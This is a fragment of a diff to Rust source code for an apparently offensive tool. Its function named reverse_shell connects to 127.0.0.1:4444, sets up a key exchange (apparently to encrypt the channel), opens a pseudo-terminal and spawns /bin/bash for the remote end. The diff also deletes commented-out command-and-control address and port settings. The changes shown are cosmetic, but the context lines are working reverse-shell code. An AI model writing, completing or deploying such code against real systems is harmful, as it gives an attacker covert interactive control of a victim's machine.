@@ -27,9 +27,6 @@ async fn main() {
 }
 
 async fn reverse_shell() -> Result<(), Box<dyn std::error::Error>> {
-    //const C2_ADDR: &str = env!("C2_ADDR");
-    //const C2_PORT: &str = env!("C2_PORT");
-
     let mut stream = TokioTcpStream::connect("127.0.0.1:4444").await?;
 
     let my_secret = EphemeralSecret::random_from_rng(OsRng);
@@ -57,7 +54,7 @@ async fn reverse_shell() -> Result<(), Box<dyn std::error::Error>> {
             pixel_width: 0,
             pixel_height: 0,
         })
-        .expect("Failed to create PTY");
+        .expect("[!] Failed to create PTY");
 
     let mut _cmd = CommandBuilder::new("/bin/bash");
     _cmd.env("TERM", "xterm-256color");
@@ -66,7 +63,7 @@ async fn reverse_shell() -> Result<(), Box<dyn std::error::Error>> {
     let _bash = pty_pair
         .slave
         .spawn_command(_cmd)
-        .expect("Failed to spawn shell");
+        .expect("[!] Failed to spawn shell");
 
     let mut pty_reader = pty_pair.master.try_clone_reader()?;
     let mut pty_writer = pty_pair.master.take_writer()?;
